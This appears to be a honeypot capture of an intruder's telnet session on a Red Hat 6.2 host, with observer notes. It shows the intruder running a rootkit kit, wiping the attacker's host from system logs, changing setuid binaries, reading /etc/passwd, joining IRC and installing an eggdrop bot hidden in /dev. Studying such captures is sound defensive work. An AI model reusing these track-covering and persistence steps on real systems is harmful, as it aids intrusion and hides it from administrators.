+nobody     364  0.0  0.0  1292    44  ?  S  Nov  5   0:00 (identd)
+nobody     365  0.0  0.0  1292    44  ?  S  Nov  5   0:00 (identd)
+nobody     518  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     519  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     520  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     521  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     522  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     523  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     524  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+nobody     525  0.0  0.0  6132     0  ?  SW Nov  5   0:00 (httpd)
+root         1  0.0  0.1  1120    68  ?  S  Nov  5   0:06 init [3] 
+root         2  0.0  0.0     0     0  ?  SW Nov  5   0:01 (kflushd)
+root         3  0.0  0.0     0     0  ?  SW Nov  5   0:00 (kupdate)
+root         4  0.0  0.0     0     0  ?  SW Nov  5   0:00 (kpiod)
+root         5  0.0  0.0     0     0  ?  SW Nov  5   0:01 (kswapd)
+root         6  0.0  0.0     0     0  ?  SW<Nov  5   0:00 (mdrecoveryd)
+root       390  0.0  0.1  1328    96  ?  S  Nov  5   0:00 crond 
+root       408  0.0  0.0  1168     0  ?  SW Nov  5   0:00 (inetd)
+root       466  0.0  0.4  2128   268  ?  S  Nov  5   0:00 sendmail: accepting c
+root       481  0.0  0.0  1144     0  ?  SW Nov  5   0:00 (gpm)
+root       495  0.0  0.0  6036    48  ?  S  Nov  5   0:01 httpd 
+root       576  0.0  0.0  1092     0   2 SW Nov  5   0:00 (mingetty)
+root       577  0.0  0.0  1092     0   3 SW Nov  5   0:00 (mingetty)
+root       578  0.0  0.0  1092     0   4 SW Nov  5   0:00 (mingetty)
+root       579  0.0  0.0  1092     0   5 SW Nov  5   0:00 (mingetty)
+root       580  0.0  0.0  1092     0   6 SW Nov  5   0:00 (mingetty)
+root       683  0.0  0.0  1092     0   1 SW Nov  5   0:00 (mingetty)
+root      2387  0.0  0.0  1464    56  ?  S   14:28   0:00 in.telnetd: c871553-b
+root      2388  0.0  0.1  2308    72  ?  S   14:28   0:00 login -- adm1       
+root      2404  0.0  0.0  2156     0  ?  SW  14:29   0:00 (su)
+root      2405  0.0  0.7  1708   492  ?  S   14:29   0:00 bash 
+root      2871  0.6  0.9  1592   624  ?  S   14:53   0:00 /usr/local/sbin/sshd
+root      2965  0.0  2.3  2304  1496  ?  S   14:54   0:00 /usr/sbin/named 
+root      2978  0.0  0.6   928   408  ?  R   14:55   0:00 ps aux 
+xfs        535  0.0  0.0  1728    60  ?  S  Nov  5   0:00 xfs -droppriv -daemon
+[root@apollo .Ci]# ls
+                              killall
+a.sh                          needz
+addn                          nfs-utils-0.1.9.1-1.i386.rpm
+addps                         paki
+backup                        pstree
+bx                            q
+chmod-it                      qs
+clean                         rmS
+do                            snap
+find                          snif
+fix                           sniff.pid
+inetd                         sp.pl
+install-named                 ssh-1.2.27
+install-sshd                  ssh-1.2.27.tar
+install-sshd1                 syslogd
+install-statd                 wuftpd.rpm
+install-wu
+[root@apollo .Ci]# ./do
+[root@apollo .Ci]# ./snap
+Dream Walker dream@sekurity.org
+Hey We still can own even if messages is 200 megs =)
+Enter your host, leave blank to quit
+hhomomee..ccoomm
+Editing home.com out of /var/log/secure
+Editing home.com out of /var/log/messages
+Editing home.com out of /var/log/xferlog
+Editing home.com out of /usr/adm/secure
+There is no /usr/adm/secure
+There is no /var/log/tempsec
+Editing home.com out of /usr/adm/messages
+There is no /usr/adm/messages
+There is no /usr/adm/tempmess
+Editing home.com out of /usr/adm/xferlog
+There is no /usr/adm/xferlog
+There is no /usr/adm/tempxfer
+home.com removed from all logs
+Enter your next host, leave blank to quit
+
+[root@apollo .Ci]# ./rmS
+getting rid of shit we dont need anymore...
+..
+...
+finished
+[root@apollo .Ci]# su noboby
+bash$ ./bx irc.standford.edu
+BitchX - Based on EPIC Software Labs epic ircII (1998).
+Version (BitchX-75p3) -- Date (19990221).
+Process [3013] connected to tty [/dev/pts/0]
+Using terminal type [vt100]
+
+** NOTE: The irc connection you are about to read is not part of the
+         actual telnet session.  Instead, it was captured to a
+         seperate file as this initiated a new connection.  However,
+         this data is the results of the irc connection initiated at
+         this telnet connection **
+
+USER nobody +iw nobody :Nobody
+NOTICE AUTH :*** Looking up your hostname...
+NOTICE AUTH :*** Checking Ident
+NOTICE AUTH :*** Found your hostname
+NOTICE AUTH :*** Got Ident response
+NICK wiz00t
+:irc.stanford.edu 001 wiz00t :Welcome to the Internet Relay Network wiz00t
+:irc.stanford.edu 002 wiz00t :Your host is irc.stanford.edu[irc.stanford.edu/6667], running version 2.8/hybrid-
+6rc4
+NOTICE wiz00t :*** Your host is irc.stanford.edu[irc.stanford.edu/6667], running version 2.8/hybrid-6rc4
+:irc.stanford.edu 003 wiz00t :This server was created Tue Sep 26 2000 at 20:51:16 PDT
+:irc.stanford.edu 004 wiz00t irc.stanford.edu 2.8/hybrid-6rc4 oiwszcrkfydnxb biklmnopstved
+:irc.stanford.edu 251 wiz00t :There are 9151 users and 39831 invisible on 36 servers
+:irc.stanford.edu 252 wiz00t 166 :IRC Operators online
+:irc.stanford.edu 254 wiz00t 21370 :channels formed
+:irc.stanford.edu 255 wiz00t :I have 771 clients and 1 servers
+:irc.stanford.edu 265 wiz00t :Current local  users: 771  Max: 1108
+:irc.stanford.edu 266 wiz00t :Current global users: 48982  Max: 56807
+:irc.stanford.edu 250 wiz00t :Highest connection count: 1109 (1108 clients)
+USERHOST wiz00tdu 375 wiz00t :- irc.stanford.edu Message of the Day - 
+:irc.stanford.edu 372 wiz00t :- Welcome to irc.stanford.edu 
+:irc.stanford.edu 372 wiz00t :- Please report problems to techie (irc@irc.stanford.edu)
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Notice: This server is not officially supported by Stanford
+:irc.stanford.edu 372 wiz00t :- University. This server is supported by a volunteer effort.
+:irc.stanford.edu 372 wiz00t :- Stanford University disclaims all responsibility for messages
+:irc.stanford.edu 372 wiz00t :- passed via this server.
+:irc.stanford.edu 372 wiz00t :- Access to non-Stanford machines is offered on a trial basis only.
+:irc.stanford.edu 372 wiz00t :- If problems occur, access will be restricted to Stanford hosts only.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Please note that I do NOT have time to support clients. Please contact
+:irc.stanford.edu 372 wiz00t :- your sysadmin, or the person who compiled your client.
+:irc.stanford.edu 372 wiz00t :- You may also ask for help on #irchelp.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Please do not idle on this server for more than 15 minutes.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Please limit the number of bots run on this server. No more than
+:irc.stanford.edu 372 wiz00t :-  1 (one) bot per person. Any bot that annoys me, or any other user,
+:irc.stanford.edu 372 wiz00t :-  may be banned without warning.
+:irc.stanford.edu 372 wiz00t :- DCC and eggdrop bots are NOT allowed, and will be banned on sight.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- If you run more than 2 (two) clients, you may expect that your excess
+:irc.stanford.edu 372 wiz00t :-  clients will be killed. Auto reconnecting clients will be considered
+:irc.stanford.edu 372 wiz00t :-  bots, and banned if their numbers continue to exceed 2 (two).
+:irc.stanford.edu 372 wiz00t :- Persistent bots will be blocked at the firewall. 
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Absolutely NO floodbots or tsunami bots on any Stanford server.
+:irc.stanford.edu 372 wiz00t :- Absolutely NO clonebots or spambots.
+:irc.stanford.edu 372 wiz00t :- Violation of this rule may lead to loss of access for your entire
+:irc.stanford.edu 372 wiz00t :- site or domain. Don't spoil it for others.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- Please use a REAL userid.. I reserve the right to kill any fakes.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- Attention Stanford campus users. If you are directly connected 
+:irc.stanford.edu 372 wiz00t :- to the campus network, Please use the new alternate address of 
+:irc.stanford.edu 372 wiz00t :- irc-b.stanford.edu
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- This will only work for hosts directly connected to the stanford
+:irc.stanford.edu 372 wiz00t :- network, including dialup, isdn, and dsl connections.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- ATTENTION ALL USERS. DUE TO THE CONTINUING DENIAL OF SERVICE 
+:irc.stanford.edu 372 wiz00t :- ATTACKS AGAINST THE SERVER, WE ARE BEGINNING TO FILTER A LARGE 
+:irc.stanford.edu 372 wiz00t :- NUMBER OF NETWORKS AT OUR ROUTERS.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- IF YOU ARE LOCATED AT A *.EDU SITE CONNECTED TO INTERNET-2, YOU
+:irc.stanford.edu 372 wiz00t :- WILL BE ALLOWED BY DEFAULT UNLESS YOUR SITE HAS BEEN FILTERED
+:irc.stanford.edu 372 wiz00t :- BECAUSE OF PAST ABUSE.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- IF YOU ARE LOCATED AT A *.EDU SITE THAT IS NOT CONNECTED TO 
+:irc.stanford.edu 372 wiz00t :- INTERNET-2, YOU SHOULD NOTIFY IRC@IRC.STANFORD.EDU OF YOUR NETWORK
+:irc.stanford.edu 372 wiz00t :- NUMBERS SO THAT WE MAY ALLOW ACCESS.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- IF YOU ARE LOCATED AT AN AFFILLIATE SITE THAT HAS BEEN ALLOWED
+:irc.stanford.edu 372 wiz00t :- ACCESS, YOU SHOULD ALSO NOTIFY IRC@IRC.STANFORD.EDU OF YOUR NETWORK 
+:irc.stanford.edu 372 wiz00t :- NUMBERS.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- IF YOU ARE LOCATED AT SOME OTHER SITE THAT HAS NOT BEEN ALLOWED 
+:irc.stanford.edu 372 wiz00t :- ACCESS, AND DO NOT FALL INTO ONE OF THE ABOVE CATEGORIES, THEN 
+:irc.stanford.edu 372 wiz00t :- YOU ARE OUT OF LUCK. PLEASE DON'T ASK FOR ACCESS.
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- IF YOU FEEL THAT YOU FALL INTO THE AFFILLIATE SITE CATEGORY, AND
+:irc.stanford.edu 372 wiz00t :- HAVE NOT BEEN ALLOWED ACCESS, PLEASE NOTIFY IRC@IRC.STANFORD.EDU
+:irc.stanford.edu 372 wiz00t :- OF THE PROBLEM. AFFILLIATE SITES ARE GENERALLY COMPANIES THAT
+:irc.stanford.edu 372 wiz00t :- HAVE RESEARCH OR DISTANCE LEARNING ARRANGEMENTS WITH STANFORD
+:irc.stanford.edu 372 wiz00t :- UNIVERSITY.  
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- When this server is split from the network, you may NOT join or
+:irc.stanford.edu 372 wiz00t :-  gain ops on channels.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- 
+:irc.stanford.edu 372 wiz00t :- techie - 08/16/00
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 372 wiz00t :- questions to irc@irc.stanford.edu.
+:irc.stanford.edu 372 wiz00t :- *****************************************************************
+:irc.stanford.edu 376 wiz00t :End of /MOTD command.
+MODE wiz00t +iw
+:irc.stanford.edu 302 wiz00t :wiz00t=+nobody@apollo.honeyt.edu    
+:wiz00t MODE wiz00t :+iw
+WHOIS wiz00t
+:irc.stanford.edu 311 wiz00t wiz00t nobody apollo.honeyt.edu * :Nobody
+:irc.stanford.edu 312 wiz00t wiz00t irc.stanford.edu :In the Heart of Silicon Valley
+:irc.stanford.edu 317 wiz00t wiz00t 6 973691953 :seconds idle, signon time
+:irc.stanford.edu 318 wiz00t wiz00t :End of /WHOIS list.
+QUIT :wiz00t has no reason
+ERROR :Closing Link: apollo.honeyt.edu (Client Quit)
+bash$ exit
+exit
+
+*** NOTE:  That was the complete irc connection initiated by the blackhat.
+           We now take you back to your regularly scheduled telnet session **
+
+[root@apollo .Ci]# ls
+           backup     do         killall    q          snif
+a.sh       bx         find       needz      qs         sniff.pid
+addn       chmod-it   fix        paki       rmS        sp.pl
+addps      clean      inetd      pstree     snap       syslogd
+[root@apollo .Ci]# ./chmod-it 
+starting..
+chmod: /usr/sbin/userhelper: No such file or directory
+!: userhelper..done
+chmod: /usr/X11R6/bin/Xwrapper: No such file or directory
+!: Xwrapper..done
+!: ping..done
+!: traceroute..done
+!: pt_chown..done
+!: dump..done
+!: restore..done
+!: gpasswd..done
+!: change..done
+!: suidperl..done
+!: newgrp..done
+!: usernetctl..done
+!: at..done
+..finished
+[root@apollo .Ci]# cd /tmp
+[root@apollo /tmp]# mkdir /dev/tpack
+[root@apollo /tmp]# mv tpack23-ef.tgz /dev/tpack
+[root@apollo /tmp]# cd
+[root@apollo /root]# cat  /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:
+operator:x:11:0:operator:/root:
+games:x:12:100:games:/usr/games:
+gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ftp:x:14:50:FTP User:/home/ftp:
+nobody:x:99:99:Nobody:/:
+xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false
+named:x:25:25:Named:/var/named:/bin/false
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+drosen:x:500:500::/home/drosen:/bin/bash
+[root@apollo /root]# chown -R drosen.users ../dev/tpack
+[root@apollo /root]# cd /dev/tpack
+[root@apollo tpack]# su drossen
+[drosen@apollo tpack]$ gunzip *
+[drosen@apollo tpack]$tar -xfv *
+ /
+ /src/
+ /src/Makefile
+ /src/chan.c
+ /src/chan.h
+ /src/chanprog.c
+ /src/cmds.c
+ /src/dcc.c
+ /src/users.c
+ /src/eggdrop.h
+ /src/tcldcc.c
+ /src/gotdcc.c
+ /src/hash.h
+ /src/mem.c
+ /src/misc.c
+ /src/mode.c
+ /src/msgcmds.c
+ /src/msgnotice.c
+ /src/net.c
+ /src/main.c
+ /src/match.c
+ /src/botcmd.c
+ /src/tandem.h
+ /src/english.h
+ /src/userrec.c
+ /src/users.h
+ /src/botnet.c
+ /src/dccutil.c
+ /src/tclegg.h
+ /src/hash.c
+ /src/tcl.c
+ /src/tclhash.c
+ /src/proto.h
+ /src/files.h
+ /src/cmdt.h
+ /src/chanset.c
+ /src/tclchan.c
+ /src/tcluser.c
+ /src/tclmisc.c
+ /src/modules.c
+ /src/notes.c
+ /src/modules.h
+ /src/mod/
+ /src/mod/Makefile
+ /src/mod/module.h
+ /src/mod/assoc.mod/
+ /src/mod/assoc.mod/assoc.c
+ /src/mod/assoc.mod/Makefile
+ /src/mod/modvals.h
+ /src/mod/blowfish.mod/
+ /src/mod/blowfish.mod/Makefile
+ /src/mod/blowfish.mod/blowfish.c
+ /src/mod/blowfish.mod/blowfish.h
+ /src/mod/blowfish.mod/bf_tab.h
+ /src/mod/filesys.mod/
+ /src/mod/filesys.mod/dccfiles.c
+ /src/mod/filesys.mod/filedb.c
+ /src/mod/filesys.mod/Makefile
+ /src/mod/filesys.mod/files.c
+ /src/mod/filesys.mod/filesys.c
+ /src/mod/filesys.mod/tclfiles.c
+ /src/mod/filesys.mod/filesys.h
+ /src/mod/transfer.mod/
+ /src/mod/transfer.mod/transfer.c
+ /src/mod/transfer.mod/Makefile
+ /src/npt.c
+ /src/evil.c
+ /config.status
+ /Makefile
+ /lush.h
+ /scripts/
+ /scripts/main.tcl
+ /scripts/vars.tcl
+ /text/
+ /text/badhost
+ /text/intro
+ /text/newuser
+ /text/files
+ /text/newbot
+ /text/banner
+ /text/newbot-limbo
+ /config.h
+ /src/dcc.c
+ /src/users.c
+ /src/eggdrop.h
+ /src/tcldcc.c
+ /src/gotdcc.c
+ /src/hash.h
+ /src/mem.c
+ /src/misc.c
+ /src/mode.c
+ /src/msgcmds.c
+ /src/msgnotice.c
+ /src/net.c
+ /src/main.c
+ /src/match.c
+ /src/botcmd.c
+ /src/tandem.h
+ /src/english.h
+ /src/userrec.c
+ /src/users.h
+ /src/botnet.c
+ /src/dccutil.c
+ /src/tclegg.h
+ /src/hash.c
+ /src/tcl.c
+ /src/tclhash.c
+ /src/proto.h
+ /src/files.h
+ /src/cmdt.h
+ /src/chanset.c
+ /src/tclchan.c
+ /src/tcluser.c
+ /src/tclmisc.c
+ /src/modules.c
+ /src/notes.c
+ /src/modules.h
+ /src/mod/
+ /src/mod/Makefile
+ /src/mod/module.h
+ /src/mod/assoc.mod/
+ /src/mod/assoc.mod/assoc.c
+ /src/mod/assoc.mod/Makefile
+ /src/mod/modvals.h
+ /src/mod/blowfish.mod/
+ /filesys/
+ /filesys/incoming/
+ /lush.h.in
+ /Makefile.in
+ /configure.in
+ /configure
+ /config.h.in
+ /encrypt.c
+ /eggdrop.conf
+ /egg.log
+ /.log.today
+ /run
+ /install
+ /config.log
+ /config.cache
+ /.log.yesterday
+ /.o.f
+ /.ldpt
+ /DEBUG
+ /salt.h
+ /e.chans
+ /e.conf
+ /e.notes
+ /e.users
+ /EGGDROP.stamp
+ /eggdrop
+[drosen@apollo tpack]$ rm tpack*
+[drosen@apollo tpack]$ cd ../""
+[drosen@apollo  ]$ ./install
+chmod: /home/drosen/.bash_history: No such file or directory
+loading cache ./config.cache
+
+This is eggdrop's GNU configure script.
+It's going to run a bunch of strange tests to hopefully make
+your compile work without much twiddling.
+
+   (standard is currently 28 bytes)
+
+I can't find Tcl on this system.
+
+Eggdrop now requires Tcl to compile.  If you already have Tcl
+installed on this system, and I just wasn't looking in the right
+place for it, set the environment variables TCLLIB and TCLINC so
+I will know where to find 'libtcl.a' (or 'libtcl.so') and 'tcl.h'
+(respectively).  Then run 'configure' again.
+
+Read the README file if you don't know what Tcl is or how to get
+it and install it.
+
+make[1]: Entering directory `/dev/tpack/ /src'
+
+aking eggdrop...
+(This will take a while.  Pour yourself an ice cold coke and chill.)
+
+gcc -c -O2 -fno-strength-reduce -Wall -I.. -DHAVE_CONFIG_H -g botcmd.c
+In file included from tclegg.h:13,
+                 from botcmd.c:25:
+../lush.h:3: /usr/include/tcl.h: No such file or directory
+In file included from proto.h:20,
+                 from tclegg.h:15,
+                 from botcmd.c:25:
+../lush.h:3: /usr/include/tcl.h: No such file or directory
+make[1]: *** [botcmd.o] Error 1
+make[1]: Leaving directory `/dev/tpack/ /src'
+make: *** [eggdrop] Error 2
+ 
+Completed installation of tpack version 2.3
+[drosen@apollo  ]$ exit
+exit
+[root@apollo tpack]# cd
+[root@apollo /root]# rm -rf /dev/tpack
+[root@apollo /root]# exit
+exit
+bash$ exit
+logout
+
+
+ !"' #'!"#P ' 38400,38400'VT100
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i586
+login: adm1
+Password: eliteness
+Last login: Wed Nov  8 08:28:41 from c871553-b.jffsn1.mo.home.com
+bash$ ls -la
+[00mtotal 10729
+drwxrwxrwt    3 root     root         1024 Nov  8 08:30 .
+drwxr-xr-x   18 root     root         1024 Nov  5 09:37 ..
+drwxrwxrwt    2 xfs      xfs          1024 Nov  5 09:33 .font-unix
+-rw-r--r--    1 root     root     10932400 Nov  8 08:45 Ci.tar
+-rw-r--r--    1 root     root         5684 Nov  4 19:04 install.log
+bash$ exit
+logout
